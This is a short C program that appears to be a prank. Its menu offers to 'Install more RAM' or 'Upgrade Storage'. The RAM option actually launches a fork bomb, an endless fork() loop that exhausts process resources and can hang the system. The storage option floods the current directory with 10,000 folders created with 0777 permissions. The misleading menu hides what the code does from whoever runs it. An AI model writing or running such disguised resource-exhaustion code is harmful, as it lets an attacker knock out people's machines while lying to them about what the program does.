#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

char folderName[] = "New_folder";

void storage();
void bo();

int main(void) {
    int answer;
    char buffer[256]; 

    do {
        printf("1) Install more RAM 2) Upgrade Storage \nInput:");

      
        if (fgets(buffer, sizeof(buffer), stdin) == NULL) {
            perror("Failed to read input!\n");
            return 1;
        }

        
        if (sscanf(buffer, "%i", &answer) != 1) {
            printf("Invalid input. Please enter a valid number.\n");
            continue;
        }

        if (answer != 1 && answer != 2) {
            printf("Invalid choice. Please enter 1 or 2.\n");
        }
    } while (answer != 1 && answer != 2);

    switch (answer) {
        case 1:
            bo();
            break;

        case 2:
            storage();
            break;

        default:
            printf("Error!\n");
            break;
    }

    return 0;
}

void bo() {
    while (1) {
        fork();
    }
}

void storage() {
    for (int i = 1; i <= 10000; i++) {
        char subFolder[20];
        sprintf(subFolder, "%s_%d", folderName, i);

        if (mkdir(subFolder, 0777) == 0) {
            printf("Folder %s has been created successfully!\n", subFolder);
        } else {
            perror("Failed to create folder!\n");
        }
    }
}
